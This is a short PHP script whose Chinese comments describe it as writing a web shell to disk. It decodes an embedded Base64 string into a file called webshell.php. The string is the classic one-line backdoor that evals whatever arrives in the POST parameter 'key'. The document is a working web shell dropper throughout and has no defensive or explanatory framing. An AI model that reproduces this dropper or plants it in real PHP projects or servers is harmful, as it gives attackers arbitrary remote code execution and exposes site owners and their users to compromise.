<?php
// 定义一个包含 Base64 编码 Web Shell 的字符串
$base64_code = "PD9waHAgQGV2YWwoJF9QT1NUWyJrZXkiXSk7Pz4=";

// 打开文件 "webshell.php" 进行写入
$webshell_file = fopen("webshell.php", "w");

// 解码 Base64 字符串并将其写入文件
fwrite($webshell_file, base64_decode($base64_code));

// 关闭文件
fclose($webshell_file);
?>
